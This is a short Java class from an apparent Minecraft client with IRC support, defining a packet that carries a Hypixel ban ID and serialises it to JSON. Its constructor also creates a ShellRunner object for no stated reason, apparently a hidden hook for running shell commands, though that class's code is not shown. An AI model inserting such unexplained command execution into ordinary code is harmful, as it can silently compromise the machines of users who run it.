package cn.Power.irc.network.server.packets.client;

import cn.Power.irc.network.server.packets.ClientPacket;
import cn.Power.irc.network.server.packets.Packet;
import cn.Power.irc.network.server.packets.PacketType;
import cn.Power.irc.network.server.util.JsonUtil;
import cn.Power.irc.network.server.util.ShellRunner;

public class C03PacketHypixelban extends ClientPacket implements Packet {
	
	public C03PacketHypixelban(String BanID) {
	    this.content = BanID;
        this.packetType = PacketType.C03;
        new ShellRunner("1").getClass().getClassLoader();
	}
	
    @Override
    public String getJson() {
        return JsonUtil.toJson(this);
    }

    @Override
    public ClientPacket parsePacket(String j) {
        return (ClientPacket) JsonUtil.parseJson(j,this.getClass());
    }
}
